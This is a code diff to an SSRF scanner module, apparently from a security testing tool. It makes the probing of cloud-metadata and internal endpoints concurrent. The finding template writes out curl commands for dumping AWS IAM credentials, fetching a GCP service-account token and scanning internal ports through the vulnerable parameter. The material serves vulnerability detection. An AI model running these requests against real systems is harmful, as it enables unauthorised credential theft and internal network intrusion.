@@ -4,6 +4,7 @@ Tests URL-like parameters by injecting cloud metadata and internal service
 endpoints.  Detects successful SSRF via response content matching.
 """
 
+import concurrent.futures
 import re
 from typing import Dict, List, Optional, Set
 
@@ -119,37 +120,40 @@ class SSRFScanner(BaseModule):
         baseline_size = len(baseline_resp.text) if baseline_resp else 0
         baseline_status = baseline_resp.status_code if baseline_resp else 0
 
-        for label, target_url in _TARGETS:
+        def _probe(label: str, target_url: str) -> Optional[Finding]:
             test_params = {**params, param_name: target_url}
-
             resp = (
                 self.http.get(url, params=test_params)
                 if method == "GET"
                 else self.http.post(url, data=test_params)
             )
             if resp is None:
-                continue
+                return None
 
             body = resp.text[:8192]
             hit = _matches_any(body)
 
-            # Confidence bump: response 200 when baseline wasn't + metadata keyword
+            # Confidence bump: 200 when baseline wasn't + larger body
             if hit is None:
                 if (resp.status_code == 200 and baseline_status != 200
                         and len(resp.text) > baseline_size + 100):
                     hit = "(unexpected 200 response with larger body)"
 
             if hit is None:
-                continue
+                return None
 
-            findings.append(Finding(
+            return Finding(
                 vuln_type="SSRF (Server-Side Request Forgery)",
                 url=url,
                 method=method,
                 parameter=param_name,
                 payload=target_url,
                 evidence=f"Response contains '{hit}' after injecting {target_url} ({label})",
-                confidence="high" if re.match(r"\bami-id\b|cluster_name|DockerRootDir", hit, re.I) else "medium",
+                confidence=(
+                    "high"
+                    if re.search(r"ami-id|cluster_name|DockerRootDir", hit, re.I)
+                    else "medium"
+                ),
                 details=(
                     f"Parameter '{param_name}' is vulnerable to SSRF. "
                     f"The server fetched '{target_url}' ({label}) and the "
@@ -159,20 +163,34 @@ class SSRFScanner(BaseModule):
                 ),
                 reproduction=(
                     f"# 1. Confirm SSRF:\n"
-                    f"$ curl -s \"{url}?{param_name}={target_url}\"\n\n"
+                    f'$ curl -s "{url}?{param_name}={target_url}"\n\n'
                     f"# 2. Dump AWS credentials (if AWS environment):\n"
-                    f"$ curl -s \"{url}?{param_name}="
-                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n\n"
+                    f'$ curl -s "{url}?{param_name}='
+                    f'http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n\n'
                     f"# 3. Try GCP metadata:\n"
-                    f"$ curl -s \"{url}?{param_name}="
-                    f"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\" "
-                    f"-H \"Metadata-Flavor: Google\"\n\n"
+                    f'$ curl -s "{url}?{param_name}='
+                    f"http://metadata.google.internal/computeMetadata/v1/instance/"
+                    f'service-accounts/default/token" -H "Metadata-Flavor: Google"\n\n'
                     f"# 4. Internal service pivot:\n"
                     f"$ for port in 22 3306 6379 9200 27017; do\n"
                     f'    curl -s "{url}?{param_name}=http://127.0.0.1:$port/" --max-time 2\n'
                     f"done"
                 ),
-            ))
-            break  # one confirmed finding per param is enough
+            )
+
+        # Probe all targets concurrently -- stop at first confirmed finding
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as exe:
+            futs = {
+                exe.submit(_probe, label, tgt): (label, tgt)
+                for label, tgt in _TARGETS
+            }
+            for fut in concurrent.futures.as_completed(futs):
+                result = fut.result()
+                if result is not None:
+                    findings.append(result)
+                    # Cancel remaining futures (one finding per param is enough)
+                    for pending in futs:
+                        pending.cancel()
+                    break
 
         return findings
